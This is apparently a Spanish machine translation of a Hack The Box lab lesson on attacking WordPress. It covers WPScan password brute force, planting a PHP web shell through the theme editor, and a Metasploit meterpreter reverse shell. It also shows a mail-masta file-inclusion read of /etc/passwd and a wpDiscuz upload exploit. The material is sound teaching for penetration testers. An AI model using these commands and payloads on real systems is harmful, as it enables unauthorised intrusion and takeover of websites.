# Attacking WordPress

Hemos confirmado que el sitio web de la compañía se está ejecutando en WordPress y enumeró la versión y los complementos instalados. Veamos ahora rutas de ataque e intentemos obtener acceso a la red interna.

Hay varias formas de abusar`built-in functionality`Para atacar una instalación de WordPress. Cubriremos el forzamiento bruto de inicio de sesión contra el`wp-login.php`Página y ejecución de código remoto a través del editor de temas. Estas dos tácticas se construyen entre sí, ya que primero necesitamos obtener credenciales válidas para que un usuario de nivel de administrador inicie sesión en el back-end de WordPress y edite un tema.

---

# **Iniciar sesión Bruteforce**

WPSCAN se puede utilizar para los nombres de usuario y contraseñas de fuerza bruta. El informe de escaneo en la sección anterior devolvió a dos usuarios registrados en el sitio web (Admin y John). La herramienta utiliza dos tipos de ataques de fuerza bruta de inicio de sesión,[xmlrpc](https://kinsta.com/blog/xmlrpc-php/)y wp-login. El`wp-login`El método intentará forzar la página de inicio de sesión de WordPress estándar, mientras que el`xmlrpc`El método utiliza la API de WordPress para hacer intentos de inicio de sesión a través de`/xmlrpc.php`. El`xmlrpc`Se prefiere el método ya que es más rápido.

Atacando a WordPress

```
xnoxos@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
[+] Started: Wed Aug 25 11:56:23 2021

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - john / firebird1
Trying john / bettyboop Time: 00:00:13 <                                      > (660 / 14345052)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: john, Password: firebird1

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Wed Aug 25 11:56:46 2021
[+] Requests Done: 799
[+] Cached Requests: 39
[+] Data Sent: 373.152 KB
[+] Data Received: 448.799 KB
[+] Memory used: 221 MB

[+] Elapsed time: 00:00:23

```

El`--password-attack`La bandera se usa para suministrar el tipo de ataque. El`-U`El argumento toma una lista de usuarios o un archivo que contiene nombres de usuario. Esto se aplica al`-P`Opción de contraseñas también. El`-t`La bandera es el número de hilos que podemos ajustar hacia arriba o hacia abajo según. WPSCAN pudo encontrar credenciales válidas para un usuario,`john:firebird1`.

---

# **Ejecución del código**

Con el acceso administrativo a WordPress, podemos modificar el código fuente de PHP para ejecutar los comandos del sistema. Inicie sesión en WordPress con las credenciales para el`john`Usuario, que nos redirigirá al panel de administración. Hacer clic en`Appearance`en el panel lateral y seleccione Editor de temas. Esta página nos permitirá editar el código fuente de PHP directamente. Se puede seleccionar un tema inactivo para evitar corromper el tema principal. Ya sabemos que el tema activo es la gravedad de transporte. En su lugar, se puede elegir un tema alternativo como veinte diecinueve.

Hacer clic en`Select`Después de seleccionar el tema, y podemos editar una página poco común como`404.php`Para agregar un shell web.

Código:php

```php
system($_GET[0]);

```

El código anterior debe permitirnos ejecutar comandos a través del parámetro GET`0`. Agregamos esta línea única al archivo justo debajo de los comentarios para evitar demasiado modificación del contenido.

![](https://academy.hackthebox.com/storage/modules/113/theme_editor.png)

Hacer clic en`Update File`en la parte inferior para guardar. Sabemos que los temas de WordPress se encuentran en`/wp-content/themes/<theme name>`. Podemos interactuar con el shell web a través del navegador o usar`cURL`. Como siempre, podemos utilizar este acceso para obtener una carcasa inversa interactiva y comenzar a explorar el objetivo.

Atacando a WordPress

```
xnoxos@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=iduid=33(www-data) gid=33(www-data) groups=33(www-data)

```

El[wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/)El módulo de Metasploit se puede usar para cargar un shell y ejecutarlo automáticamente.

El módulo carga un complemento malicioso y luego lo usa para ejecutar una capa de meterpreter PHP. Primero necesitamos establecer las opciones necesarias.

Atacando a WordPress

```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local

```

Entonces podemos emitir el`show options`Comandar para asegurarse de que todo esté configurado correctamente. En este ejemplo de laboratorio, debemos especificar tanto el VHOST como la dirección IP, o el exploit fallará con el error`Exploit aborted due to failure: not-found: The target does not appear to be using WordPress`.

Atacando a WordPress

```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting           Required  Description
   ----       ---------------           --------  -----------
   PASSWORD   firebird1                 yes       The WordPress password to authenticate with
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.42.195             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                        yes       The target port (TCP)
   SSL        false                     no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                         yes       The base path to the wordpress application
   USERNAME   john                      yes       The WordPress username to authenticate with
   VHOST      blog.inlanefreight.local  no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   WordPress

```

Una vez que estamos satisfechos con la configuración, podemos escribir`exploit`y obtener una carcasa inversa. Desde aquí, podríamos comenzar a enumerar el host para datos o rutas confidenciales para la escalada de privilegios verticales/horizontales y el movimiento lateral.

Atacando a WordPress

```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444
[*] Authenticating with WordPress using doug:jessica1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php...
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:42816) at 2021-09-20 19:43:46 -0400
i[+] Deleted wCoUuUPfIO.php
[+] Deleted CczIptSXlr.php
[+] Deleted ../CczIptSXlr

meterpreter > getuid

Server username: www-data (33)

```

En el ejemplo anterior, el módulo MetaSploit cargó el`wCoUuUPfIO.php`archivo al`/wp-content/plugins`directorio. Muchos módulos de metasploit (y otras herramientas) intentan limpiar después de sí mismos, pero algunos fallan. Durante una evaluación, queremos hacer todo lo posible para limpiar este artefacto del sistema de clientes y, independientemente de si pudimos eliminarlo o no, debemos enumerar este artefacto en nuestro informe Apéndices. Por lo menos, nuestro informe debe tener una sección de apéndice que enumere la siguiente información, más en esto en un módulo posterior.

- Sistemas explotados (nombre de host/IP y método de explotación)
- Usuarios comprometidos (nombre de cuenta, método de compromiso, tipo de cuenta (local o dominio))
- Artefactos creados en sistemas
- Cambios (como agregar un usuario administrador local o modificar la membresía del grupo)

---

# **Aprovechando vulnerabilidades conocidas**

Con los años, WordPress Core ha sufrido su parte justa de las vulnerabilidades, pero la gran mayoría de ellos se pueden encontrar en los complementos. Según la página de estadísticas de vulnerabilidad de WordPress alojada[aquí](https://wpscan.com/statistics), al momento de escribir, había 23,595 vulnerabilidades en la base de datos WPSCAN. Estas vulnerabilidades se pueden desglosar de la siguiente manera:

- 4% de WordPress Core
- 89% de complementos
- 7% de temas

El número de vulnerabilidades relacionadas con WordPress ha crecido constantemente desde 2014, probablemente debido a la gran cantidad de temas y complementos gratuitos (y pagados) disponibles, con cada semana cada semana. Por esta razón, debemos ser extremadamente minuciosos cuando enumeramos un sitio de WordPress, ya que podemos encontrar complementos con vulnerabilidades recientemente descubiertas o incluso complementos viejos, no utilizados/olvidados que ya no tienen un propósito en el sitio pero aún se puede acceder.

Nota: podemos usar el[Waybackurls](https://github.com/tomnomnom/waybackurls)herramienta para buscar versiones más antiguas de un sitio de destino utilizando la máquina Wayback. A veces podemos encontrar una versión anterior de un sitio de WordPress utilizando un complemento que tenga una vulnerabilidad conocida. Si el complemento ya no está en uso, pero los desarrolladores no lo eliminaron correctamente, es posible que aún podamos acceder al directorio en el que se almacena y explotar un defecto.

### **Complementos vulnerables - Mail -Masta**

Veamos algunos ejemplos. El complemento[mail-masta](https://wordpress.org/plugins/mail-masta/)ya no es compatible pero ha tenido más de 2.300[descargas](https://wordpress.org/plugins/mail-masta/advanced/)a lo largo de los años. No está fuera del ámbito de la posibilidad de que podamos encontrarnos con este complemento durante una evaluación, probablemente instalado una vez y olvidado. Desde 2016 ha sufrido un[inyección SQL no autenticada](https://www.exploit-db.com/exploits/41438)y un[Inclusión de archivos locales](https://www.exploit-db.com/exploits/50226).

Echemos un vistazo al código vulnerable para el complemento Mail-Masta.

Código:php

```php
<?phpinclude($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

Como podemos ver, el`pl`El parámetro nos permite incluir un archivo sin ningún tipo de validación de entrada o desinfección. Usando esto, podemos incluir archivos arbitrarios en el servidor web. Explotemos esto para recuperar el contenido del`/etc/passwd`archivo usando`cURL`.

Atacando a WordPress

```
xnoxos@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false

```

### **Complementos vulnerables - wpdiscuz**

[wpdiscuz](https://wpdiscuz.com/)es un complemento de WordPress para comentarios mejorados en las publicaciones de la página. Al momento de escribir, el complemento había terminado[1,6 millones de descargas](https://wordpress.org/plugins/wpdiscuz/advanced/)Y más de 90,000 instalaciones activas, lo que lo convierte en un complemento extremadamente popular que tenemos muy buenas posibilidades de encontrarnos durante una evaluación. Basado en el número de versión (7.0.4), esto[explotar](https://www.exploit-db.com/exploits/49967)tiene una buena oportunidad para obtener la ejecución de comando de los Estados Unidos. El quid de la vulnerabilidad es un bypass de carga de archivo. WPDiscuz está destinado solo a permitir accesorios de imagen. Las funciones de tipo MIME de archivo podrían omitirse, permitiendo que un atacante no autenticado cargue un archivo PHP malicioso y obtenga la ejecución de código remoto. Se puede encontrar más sobre las funciones de detección de tipo MIME[aquí](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/).

El script de exploit toma dos parámetros:`-u`la url y`-p`el camino a una publicación válida.

Atacando a WordPress

```
xnoxos@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
---------------------------------------------------------------

[+] Response length:[102476] | code:[200]
[!] Got wmuSecurity value: 5c9398fcdb
[!] Got wmuSecurity value: 1

[+] Generating random name for Webshell...
[!] Generated webshell name: uthsdkbywoxeebg

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot;

> id

[x] Failed to execute PHP code...

```

El exploit tal como está escrito puede fallar, pero podemos usar`cURL`para ejecutar comandos utilizando el shell web cargado. Solo necesitamos agregar`?cmd=`después de la`.php`Extensión para ejecutar comandos que podemos ver en el script de explotación.

Atacando a WordPress

```
xnoxos@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=idGIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

En este ejemplo, nos gustaría asegurarnos de limpiar el`uthsdkbywoxeebg-1629904090.8191.php`Archivo y una vez más enumere como un artefacto de prueba en los apéndices de nuestro informe.

---

# **Avanzar**

Como hemos visto en las últimas dos secciones, WordPress presenta una vasta superficie de ataque. Durante nuestras carreras como probadores de penetración, casi definitivamente nos encontraremos con WordPress muchas veces. Debemos tener las habilidades para presionar rápidamente una instalación de WordPress y realizar una enumeración exhaustiva manual y basada en herramientas para descubrir configuraciones y vulnerabilidades de alto riesgo. Si estas secciones en WordPress fueron interesantes, consulte el[Atacando el módulo de WordPress](https://academy.hackthebox.com/course/preview/hacking-wordpress)para más práctica.